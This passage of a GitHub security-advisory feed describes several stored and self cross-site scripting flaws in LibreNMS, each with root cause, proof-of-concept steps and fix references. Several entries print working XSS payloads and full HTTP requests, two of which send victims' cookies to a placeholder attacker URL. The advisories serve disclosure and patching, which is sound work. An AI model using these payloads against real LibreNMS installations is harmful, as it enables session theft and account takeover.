<li><a href="https://github.com/advisories/GHSA-3636-hx62-pv26">https://github.com/advisories/GHSA-3636-hx62-pv26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3636-hx62-pv26</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-02T21:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS vulnerable to Stored Cross-site Scripting via File Upload]]></title>
        <id>https://github.com/advisories/GHSA-x8gm-j36p-fppf</id>
        <link href="https://github.com/advisories/GHSA-x8gm-j36p-fppf"/>
        <updated>2024-10-01T22:27:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Stored Cross-Site Scripting (XSS) can archive via Uploading a new Background for a Custom Map.</p>
<h3 id="details">Details</h3>
<p>Users with "admin" role can set background for a custom map, this allow the upload of SVG file that can contain XSS payload which will trigger onload. This led to Stored Cross-Site Scripting (XSS).</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Login using an Admin role account.</p>
</li>
<li><p>Go over to "$URL/maps/custom", the Manage Custom Maps.
<img alt="image" src="https://github.com/user-attachments/assets/9d621532-7880-4010-b12d-efd377f0cfdd"></p>
</li>
<li><p>Create a new map then choose to edit it.</p>
</li>
<li><p>Choose the "Set Background" option.
<img alt="image" src="https://github.com/user-attachments/assets/dc2e9453-ef3e-4649-a42f-60b7a2ad8189"></p>
</li>
<li><p>Choose to upload a SVG file that have this content.</p>
</li>
</ol>
<pre><code class="language-svg">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;
  &lt;circle cx="50" cy="50" r="40" /&gt;
&lt;/svg&gt;
</code></pre>
<ol start="6">
<li><p>Once uploaded, there should be a link to the SVG return in the POST request to the API "$URL/maps/custom/1/background".
<img alt="image" src="https://github.com/user-attachments/assets/dc224960-0bd3-42c9-ad49-2ec85b065939"></p>
</li>
<li><p>Go over to that link on browser, should see a pop-up.
<img alt="image" src="https://github.com/user-attachments/assets/47a7db14-bd89-48fe-885a-fd80a052115e"></p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Attacker can use this to perform malicious java script code for malicious intent.
This would impact other Admin role users and the Global Read role users. Normal users does not have permission to read the file, so they are not affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-x8gm-j36p-fppf">https://github.com/librenms/librenms/security/advisories/GHSA-x8gm-j36p-fppf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47528">https://nvd.nist.gov/vuln/detail/CVE-2024-47528</a></li>
<li><a href="https://github.com/librenms/librenms/commit/d959bf1b366319eda16e3cd6dfda8a22beb203be">https://github.com/librenms/librenms/commit/d959bf1b366319eda16e3cd6dfda8a22beb203be</a></li>
<li><a href="https://github.com/advisories/GHSA-x8gm-j36p-fppf">https://github.com/advisories/GHSA-x8gm-j36p-fppf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x8gm-j36p-fppf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-01T22:27:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has Stored Cross-site Scripting vulnerability in "Alert Transports" feature]]></title>
        <id>https://github.com/advisories/GHSA-7f84-28qh-9486</id>
        <link href="https://github.com/advisories/GHSA-7f84-28qh-9486"/>
        <updated>2024-10-01T21:53:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Alert Transports" feature allows authenticated users to inject arbitrary JavaScript through the "Details" section (which contains multiple fields depending on which transport is selected at that moment). This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions.</p>
<h3 id="details">Details</h3>
<p>The vulnerability occurs when creating an alert transport. The application does not properly sanitize the user input in the "Details" field, allowing an attacker to inject and store arbitrary JavaScript. This script is then executed in the context of the page whenever the alert transport is viewed or processed.</p>
<p>For instance, the following payload can be used to trigger the XSS:
<code>test1&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code></p>
<p>When the page containing the transport details is loaded, this payload causes the browser to execute the injected script, which in this case triggers an alert popup.</p>
<p>The root cause of the vulnerability is that the application does not sanitize the value of $instance-&gt;displayDetails before appending it to the HTML output. This is demonstrated in the following code:
<a href="https://github.com/librenms/librenms/blob/4777247327c793ed0a3306d0464b95176008177b/includes/html/print-alert-transports.php#L40">https://github.com/librenms/librenms/blob/4777247327c793ed0a3306d0464b95176008177b/includes/html/print-alert-transports.php#L40</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a new alert transport in the LibreNMS interface.</li>
<li>Depending on the transport chosen, just input the following payload in any field that ends up in the "Details" section:</li>
</ol>
<p><code>test1&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code>
3. Save the transport and trigger the alert.
4. When the transport details are accessed, the injected script executes, displaying an alert popup.</p>
<p>Example Request:</p>
<pre><code class="language-http">POST /ajax_form.php HTTP/1.1
Host: &lt;your_host&gt;
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: &lt;your_XSRF_token&gt;
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: &lt;your_cookie&gt;

_token=&lt;your_token&gt;&amp;transport_id=2&amp;type=alert-transports&amp;name=Test1&amp;transport-choice=canopsis-form&amp;_token=Ep6belaqXe5qE301CGmtoOWJ71gvRfBXjRyhXEpH&amp;transport-type=canopsis&amp;canopsis-host=localhost%3Cscript%3E%7Bonerror%3Dalert%7Dthrow+1337%3C%2Fscript%3E&amp;canopsis-port=5000&amp;canopsis-user=%3Cscript%3E%7Bonerror%3Dalert%7Dthrow+1337%3C%2Fscript%3E&amp;canopsis-pass=%3Cscript%3E%7Bonerror%3Dalert%7Dthrow+1337%3C%2Fscript%3E&amp;canopsis-vhost=%3Cscript%3E%7Bonerror%3Dalert%7Dthrow+1337%3C%2Fscript%3E
</code></pre>
<h3 id="impact">Impact</h3>
<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-7f84-28qh-9486">https://github.com/librenms/librenms/security/advisories/GHSA-7f84-28qh-9486</a></li>
<li><a href="https://github.com/librenms/librenms/commit/ee1afba003d33667981e098c83295f599d88439c">https://github.com/librenms/librenms/commit/ee1afba003d33667981e098c83295f599d88439c</a></li>
<li><a href="https://github.com/librenms/librenms/blob/4777247327c793ed0a3306d0464b95176008177b/includes/html/print-alert-transports.php#L40">https://github.com/librenms/librenms/blob/4777247327c793ed0a3306d0464b95176008177b/includes/html/print-alert-transports.php#L40</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47523">https://nvd.nist.gov/vuln/detail/CVE-2024-47523</a></li>
<li><a href="https://github.com/advisories/GHSA-7f84-28qh-9486">https://github.com/advisories/GHSA-7f84-28qh-9486</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f84-28qh-9486</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T20:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has Stored Cross-site Scripting vulnerability in "Device Group" Name]]></title>
        <id>https://github.com/advisories/GHSA-fc38-2254-48g7</id>
        <link href="https://github.com/advisories/GHSA-fc38-2254-48g7"/>
        <updated>2024-10-01T21:53:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The application fail to sanitising inputs properly and rendering the code from user input to browser which allow an attacker to execute malicious javascript code.</p>
<h3 id="details">Details</h3>
<p>User with Admin role can create a Device Groups, the application did not properly sanitize the user input in the Device Groups name, when user see the detail of the Device Group, if java script code is inside the name of the Device Groups, its will be trigger.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Login as an Admin role user. Then go over to "$URL/device-groups"</p>
</li>
<li><p>Create a new Device Group with this payload in their name</p>
</li>
</ol>
<pre><code class="language-js">&lt;img src="x" onerror="alert(document.cookie)"&gt;
</code></pre>
<p><img alt="image" src="https://github.com/user-attachments/assets/2764b313-ee65-47e9-ab57-559d75f4575c"></p>
<ol start="3">
<li>Go over to the detail page of that Device Groups, in this case "$URL/devices/group=2". Will see a pop-up.
<img alt="image" src="https://github.com/user-attachments/assets/f743ca74-5dcb-4e72-ac56-dda2b42e2986"></li>
</ol>
<h3 id="impact">Impact</h3>
<p>Attacker can use this to perform malicious java script code for malicious intent.
This would impact all users as anyone can have access to the detail page of the device group.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-fc38-2254-48g7">https://github.com/librenms/librenms/security/advisories/GHSA-fc38-2254-48g7</a></li>
<li><a href="https://github.com/librenms/librenms/commit/d3b51560a8e2343e520d16e9adc72c6951aa91ee">https://github.com/librenms/librenms/commit/d3b51560a8e2343e520d16e9adc72c6951aa91ee</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47524">https://nvd.nist.gov/vuln/detail/CVE-2024-47524</a></li>
<li><a href="https://github.com/advisories/GHSA-fc38-2254-48g7">https://github.com/advisories/GHSA-fc38-2254-48g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fc38-2254-48g7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-01T20:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has Stored Cross-site Scripting vulnerability in "Alert Rules" feature]]></title>
        <id>https://github.com/advisories/GHSA-j2j9-7pr6-xqwv</id>
        <link href="https://github.com/advisories/GHSA-j2j9-7pr6-xqwv"/>
        <updated>2024-10-01T21:52:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Alert Rules" feature allows authenticated users to inject arbitrary JavaScript through the "Title" field. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions.</p>
<h3 id="details">Details</h3>
<p>The vulnerability occurs when creating an alert rule. The application does not properly sanitize user inputs in the "Title" field, which allows an attacker to escape the attribute context where the title is injected (data-content). Despite some character restrictions, the attacker can still inject a payload that leverages available attributes on the div element to execute JavaScript automatically when the page loads.</p>
<p>For example, the following payload can be used:
<code>test1'' autofocus onfocus="document.location='https://&lt;attacker-url&gt;/logger.php?c='+document.cookie"</code></p>
<p>This payload triggers the XSS when the affected page is loaded, automatically redirecting the user to the attacker's controlled domain with any non-httponly cookies present.</p>
<p>The vulnerability stems from the application not sanitizing the value of $rule['name'] before adding it to the $enabled_msg variable. This is evident in the code:</p>
<p><a href="https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405">https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a new alert rule in the LibreNMS interface.</li>
<li>In the "Title" field, input the following payload:</li>
</ol>
<p><code>test1'' autofocus onfocus="document.location='https://&lt;attacker-url&gt;/logger.php?c='+document.cookie"</code>
3. Save the rule and trigger the alert.
4. Observe that when the page loads, the injected JavaScript executes and redirects the user, sending their non-httponly cookies to the attacker's server.</p>
<p>Example Request:</p>
<pre><code class="language-http">POST /ajax_form.php HTTP/1.1
Host: &lt;your_host&gt;
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: &lt;your_XSRF_token&gt;
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: &lt;your_cookie&gt;

_token=&lt;your_token&gt;&amp;device_id=-1&amp;device_name=invalid+hostname&amp;rule_id=17&amp;type=alert-rules&amp;template_id=&amp;builder_json=%7B%22condition%22%3A%22AND%22%2C%22rules%22%3A%5B%7B%22id%22%3A%22access_points.accesspoint_id%22%2C%22field%22%3A%22access_points.accesspoint_id%22%2C%22type%22%3A%22string%22%2C%22input%22%3A%22text%22%2C%22operator%22%3A%22not_equal%22%2C%22value%22%3A%22test2'%5C%22%22%7D%5D%2C%22valid%22%3Atrue%7D&amp;name=test1''+autofocus+onfocus%3D%22document.location%3D'https%3A%2F%2F&lt;attacker_url&gt;%2Flogger.php%3Fc%3D'%2Bdocument.cookie%22&amp;builder_rule_0_filter=access_points.accesspoint_id&amp;builder_rule_0_operator=not_equal&amp;builder_rule_0_value_0=test2'%22&amp;severity=warning&amp;count=1&amp;delay=1m&amp;interval=5m&amp;recovery=on&amp;acknowledgement=on&amp;maps%5B%5D=1&amp;proc=&amp;notes=Test2'%22&amp;override_query=on&amp;adv_query=select+'test3'%22'%3B
</code></pre>
<h3 id="impact">Impact</h3>
<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-j2j9-7pr6-xqwv">https://github.com/librenms/librenms/security/advisories/GHSA-j2j9-7pr6-xqwv</a></li>
<li><a href="https://github.com/librenms/librenms/commit/7620d220e48563938d869da7689b8ac3f7721490">https://github.com/librenms/librenms/commit/7620d220e48563938d869da7689b8ac3f7721490</a></li>
<li><a href="https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405">https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/print-alert-rules.php#L405</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47525">https://nvd.nist.gov/vuln/detail/CVE-2024-47525</a></li>
<li><a href="https://github.com/advisories/GHSA-j2j9-7pr6-xqwv">https://github.com/advisories/GHSA-j2j9-7pr6-xqwv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2j9-7pr6-xqwv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T20:31:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has Stored Cross-site Scripting vulnerability in "Alert Templates" feature]]></title>
        <id>https://github.com/advisories/GHSA-gcgp-q2jq-fw52</id>
        <link href="https://github.com/advisories/GHSA-gcgp-q2jq-fw52"/>
        <updated>2024-10-01T21:52:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Self Cross-Site Scripting (Self-XSS) vulnerability in the "Alert Templates" feature allows users to inject arbitrary JavaScript into the alert template's name. This script executes immediately upon submission but does not persist after a page refresh.</p>
<h3 id="details">Details</h3>
<p>The vulnerability occurs when creating an alert template in the LibreNMS interface. Although the application sanitizes the "name" field when storing it in the database, this newly created template is immediately added to the table without any sanitization being applied to the name, allowing users to inject arbitrary JavaScript. This script executes when the template is created but does not persist in the database, thus preventing stored XSS.</p>
<p>For instance, the following payload can be used to exploit the vulnerability:
<code>test1&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code></p>
<p>The root cause of this vulnerability lies in the lack of sanitization of the "name" variable before it is rendered in the table. The vulnerability exists because the bootgrid function of the jQuery grid plugin does not sanitize the text being added to the table. Although tags are stripped before being added to the database (as shown in the code below), the vulnerability still allows Self-XSS during the creation of the template.</p>
<p>Where the variable is being sanitized before being stored in the database:
<a href="https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/forms/alert-templates.inc.php#L40">https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/forms/alert-templates.inc.php#L40</a></p>
<p>Where the vulnerability is happening:
<a href="https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/modal/alert_template.inc.php#L205">https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/modal/alert_template.inc.php#L205</a> </p>
<h3 id="poc">PoC</h3>
<ol>
<li>Navigate to the "Alert Templates" creation page in the LibreNMS interface.</li>
<li>In the "Name" field, input the following payload:</li>
</ol>
<p><code>test1&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code>
3. Submit the form to create the alert template.
4. Observe that the JavaScript executes immediately, triggering an alert popup. However, this code does not persist after refreshing the page.</p>
<h3 id="impact">Impact</h3>
<p>This is a Self Cross-Site Scripting (Self-XSS) vulnerability. Although the risk is lower compared to traditional XSS, it can still be exploited through social engineering or tricking users into entering or interacting with malicious code. This can lead to unauthorized actions or data exposure in the context of the affected user's session.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-gcgp-q2jq-fw52">https://github.com/librenms/librenms/security/advisories/GHSA-gcgp-q2jq-fw52</a></li>
<li><a href="https://github.com/librenms/librenms/commit/f259edc19b9f0ccca484c60b1ba70a0bfff97ef5">https://github.com/librenms/librenms/commit/f259edc19b9f0ccca484c60b1ba70a0bfff97ef5</a></li>
<li><a href="https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/forms/alert-templates.inc.php#L40">https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/forms/alert-templates.inc.php#L40</a></li>
<li><a href="https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/modal/alert_template.inc.php#L205">https://github.com/librenms/librenms/blob/0e741e365aa974a74aee6b43d1b4b759158a5c7e/includes/html/modal/alert_template.inc.php#L205</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47526">https://nvd.nist.gov/vuln/detail/CVE-2024-47526</a></li>
<li><a href="https://github.com/advisories/GHSA-gcgp-q2jq-fw52">https://github.com/advisories/GHSA-gcgp-q2jq-fw52</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcgp-q2jq-fw52</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-01T20:31:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has Stored Cross-site Scripting vulnerability in "Device Dependencies" feature]]></title>
        <id>https://github.com/advisories/GHSA-rwwc-2v8q-gc9v</id>
        <link href="https://github.com/advisories/GHSA-rwwc-2v8q-gc9v"/>
        <updated>2024-10-01T21:53:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Device Dependencies" feature allows authenticated users to inject arbitrary JavaScript through the device name ("hostname" parameter). This vulnerability can lead to the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and allowing unauthorized actions.</p>
<h3 id="details">Details</h3>
<p>The vulnerability occurs when creating a device within LibreNMS. An attacker can inject arbitrary JavaScript into the hostname parameter. This malicious script is then executed when another user visits the device dependencies page, resulting in an automatic redirect to a website controlled by the attacker. This redirect can be used to steal session cookies or perform other malicious actions.</p>
<p>For example, the following payload can be used to exploit the vulnerability:
<code>t'' autofocus onfocus="document.location='https://&lt;attacker_url&gt;/?c='+document.cookie"</code></p>
<p>When the device dependencies page is loaded, this payload triggers the JavaScript, causing the user's browser to redirect to the attacker's website with any non-httponly cookies in the URL.</p>
<p>The root cause of this vulnerability is the application's failure to sanitize the row.hostname value before including it in the HTML output. </p>
<p>This is evident in the following line of code:
<a href="https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74">https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74</a></p>
<h3 id="poc">PoC</h3>
<ol>
<li>Add a new device using the following payload for the hostname:</li>
</ol>
<p><code>t'' autofocus onfocus="document.location='https://&lt;attacker_url&gt;/?c='+document.cookie"</code>
2. Save the device.
3. Navigate to the device dependencies page.
4. Observe that the injected script executes, redirecting the user to the attacker's website with any non-httponly cookies included in the URL.</p>
<p>Example Request:</p>
<pre><code class="language-http">POST /addhost HTTP/1.1
Host: &lt;your_host&gt;
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: &lt;your_cookie&gt;

_token=&lt;your_token&gt;&amp;hostname=t%27%27+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%&lt;attacker_url&gt;%2F%3Fc%3D%27%2Bdocument.cookie%22&amp;sysName=&amp;hardware=&amp;os=&amp;os_id=&amp;snmpver=v2c&amp;port=&amp;transport=udp&amp;port_assoc_mode=ifIndex&amp;community=&amp;authlevel=noAuthNoPriv&amp;authname=&amp;authpass=&amp;authalgo=SHA&amp;cryptopass=&amp;cryptoalgo=AES&amp;force_add=on&amp;Submit=
</code></pre>
<h3 id="impact">Impact</h3>
<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-rwwc-2v8q-gc9v">https://github.com/librenms/librenms/security/advisories/GHSA-rwwc-2v8q-gc9v</a></li>
<li><a href="https://github.com/librenms/librenms/commit/36b38a50cc10d4ed16caab92bdc18ed6abac9685">https://github.com/librenms/librenms/commit/36b38a50cc10d4ed16caab92bdc18ed6abac9685</a></li>
<li><a href="https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74">https://github.com/librenms/librenms/blob/9455173edce6971777cf6666d540eeeaf6201920/includes/html/pages/device-dependencies.inc.php#L74</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47527">https://nvd.nist.gov/vuln/detail/CVE-2024-47527</a></li>
<li><a href="https://github.com/advisories/GHSA-rwwc-2v8q-gc9v">https://github.com/advisories/GHSA-rwwc-2v8q-gc9v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rwwc-2v8q-gc9v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-01T20:31:04.000Z</published>
    </entry>
</feed>